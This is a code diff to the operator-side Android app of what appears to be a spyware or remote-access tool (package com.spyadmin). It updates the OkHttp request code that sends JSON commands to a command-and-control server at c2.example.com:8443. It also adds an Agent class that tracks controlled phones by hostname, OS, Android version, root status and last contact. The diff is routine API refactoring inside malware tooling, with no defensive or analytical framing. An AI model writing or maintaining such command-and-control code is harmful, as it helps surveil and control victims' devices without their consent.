@@ -1,5 +1,6 @@
 package com.spyadmin
 
+import android.app.AlertDialog
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.os.Bundle
@@ -11,7 +12,12 @@ import android.view.View
 import android.widget.*
 import androidx.appcompat.app.AppCompatActivity
 import com.google.gson.Gson
-import okhttp3.*
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
+import okhttp3.Response
+import java.io.IOException
 import java.util.concurrent.TimeUnit
 
 class RemoteControlActivity : AppCompatActivity() {
@@ -206,15 +212,28 @@ class RemoteControlActivity : AppCompatActivity() {
 
     private fun request(method: String, endpoint: String, body: Any, callback: (String) -> Unit) {
         val url = "https://c2.example.com:8443$endpoint"
-        val requestBody = RequestBody.create(gson.toJson(body), MediaType.get("application/json"))
+        val requestBody = body.toJson().toRequestBody("application/json".toMediaType())
         val request = Request.Builder().url(url).method(method, requestBody).build()
-        client.newCall(request).enqueue(object : Callback {
-            override fun onFailure(call: Call, e: Exception) {
+        client.newCall(request).enqueue(object : okhttp3.Callback {
+            override fun onFailure(call: okhttp3.Call, e: IOException) {
                 runOnUiThread { Toast.makeText(this@RemoteControlActivity, "Error: ${e.message}", Toast.LENGTH_SHORT).show() }
             }
-            override fun onResponse(call: Call, response: okhttp3.Response) {
+            override fun onResponse(call: okhttp3.Call, response: Response) {
                 response.body?.string()?.let { callback(it) }
             }
         })
     }
 }
+
+data class Agent(
+    val id: String,
+    val hostname: String,
+    val os: String,
+    val arch: String,
+    val androidVersion: String,
+    val sdk: Int,
+    val rooted: Boolean,
+    val lastSeen: String
+)
+
+fun Any.toJson(): String = com.google.gson.Gson().toJson(this)
